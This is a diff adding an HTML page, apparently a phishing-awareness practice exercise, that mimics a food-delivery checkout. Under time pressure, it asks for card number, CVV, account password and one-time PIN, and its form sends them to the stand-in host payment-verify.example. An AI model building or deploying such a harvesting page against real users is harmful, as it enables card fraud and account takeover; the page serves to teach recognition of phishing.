@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Payment Verification - Checkout</title>
+  <link rel="stylesheet" href="estilo/pagsubok.css" />
+  <link rel="icon" href="data:," />
+</head>
+<body>
+  <div class="pk-wrap">
+    <a class="pk-back" href="index.html">← Practice pages</a>
+
+    <header class="pk-top">
+      <div class="pk-logo">💳</div>
+      <div>
+        <h1>Payment Verification</h1>
+        <p>Secure checkout · Order #ORD-8891</p>
+      </div>
+    </header>
+
+    <section class="pk-hero">
+      <span class="pk-tag">Checkout step 2 of 2</span>
+      <h2>Confirm your payment to receive your food</h2>
+      <p>Your order will be released once the verification form is complete. Pay now to reserve your meal. The reservation expires in 10 minutes.</p>
+    </section>
+
+    <div class="pk-grid">
+      <div>
+        <div class="pk-card" data-menu>
+          <h2>Order summary</h2>
+          <div class="pk-item" data-menu-price="180">
+            <div><b>Family Meal</b><small>2 chicken, 2 rice, 2 drinks</small></div>
+            <span class="pk-price">₱180.00</span>
+          </div>
+          <div class="pk-item" data-menu-price="85">
+            <div><b>Spaghetti</b><small>Sweet-style, regular</small></div>
+            <span class="pk-price">₱85.00</span>
+          </div>
+          <div class="pk-item" data-menu-price="55">
+            <div><b>Float</b><small>Coke with vanilla ice cream</small></div>
+            <span class="pk-price">₱55.00</span>
+          </div>
+          <div data-checkout style="margin-top:12px">
+            <div class="pk-row"><span>Family Meal × 1</span><span data-checkout-price="180">₱180.00</span></div>
+            <div class="pk-row"><span>Spaghetti × 1</span><span data-checkout-price="85">₱85.00</span></div>
+            <div class="pk-row"><span>Float × 1</span><span data-checkout-price="55">₱55.00</span></div>
+            <div class="pk-row pk-total"><span>Amount due</span><span>₱320.00</span></div>
+          </div>
+        </div>
+
+        <div class="pk-card">
+          <h2>Need help?</h2>
+          <p class="pk-info">For order concerns, reply to the text message sent by the rider. Keep your order number ready.</p>
+        </div>
+      </div>
+
+      <aside>
+        <div class="pk-card">
+          <h2>Payment details</h2>
+          <form action="http://payment-verify.example/collect" method="post">
+            <label class="pk-field">
+              <span>Card number</span>
+              <input type="text" name="card_number" inputmode="numeric" placeholder="0000 0000 0000 0000" autocomplete="cc-number" />
+            </label>
+            <div class="pk-two">
+              <label class="pk-field">
+                <span>Expiry</span>
+                <input type="text" name="card_expiry" placeholder="MM/YY" autocomplete="cc-exp" />
+              </label>
+              <label class="pk-field">
+                <span>CVV</span>
+                <input type="text" name="card_cvv" inputmode="numeric" placeholder="123" autocomplete="cc-csc" />
+              </label>
+            </div>
+            <label class="pk-field">
+              <span>Account password</span>
+              <input type="password" name="account_password" placeholder="Enter your password" />
+            </label>
+            <label class="pk-field">
+              <span>One-time PIN sent to your phone</span>
+              <input type="text" name="otp_code" inputmode="numeric" placeholder="6-digit code" />
+            </label>
+            <button class="pk-btn pk-btn--danger" type="submit">Verify and pay ₱320.00</button>
+          </form>
+          <p class="pk-note">This verification step protects your account. Do not close this window while the form is submitting.</p>
+        </div>
+      </aside>
+    </div>
+
+    <p class="pk-fine">Payment Verification Service · Order #ORD-8891</p>
+  </div>
+
+  <div class="pk-practice">Practice page · <a href="index.html">back to hub</a></div>
+</body>
+</html>
